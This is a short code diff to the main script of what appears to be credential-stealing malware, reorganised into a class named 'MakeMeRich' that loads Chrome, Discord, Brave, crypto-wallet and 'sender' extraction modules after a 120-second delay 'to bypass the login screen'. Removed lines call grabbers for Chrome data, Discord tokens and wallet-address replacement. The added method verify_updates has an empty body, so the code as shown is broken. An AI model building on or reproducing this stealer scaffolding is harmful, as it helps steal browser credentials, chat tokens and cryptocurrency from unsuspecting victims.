@@ -1,11 +1,21 @@
-from chrome import cgrab
-from discord import tgrab
-from wreplacer import wallet_replace
+from chrome import Chrome
+from discord import Discord
+from brave import Brave
+from crypto import CryptoStuff
 from time import sleep
+from sender import Extract
 
 
-sleep(120)
+class MakeMeRich(object):
+    def __init__(self) -> None:
+        sleep(120)  # time to bypass the login screen
+        self.chrome = Chrome()
+        self.discord = Discord()
+        self.brave = Brave()
+        self.extract = Extract()
+        self.cryptostuff = CryptoStuff()
 
-cgrab()
-tgrab()
-wallet_replace()
+    def verify_updates(self):
+
+
+MakeMeRich()
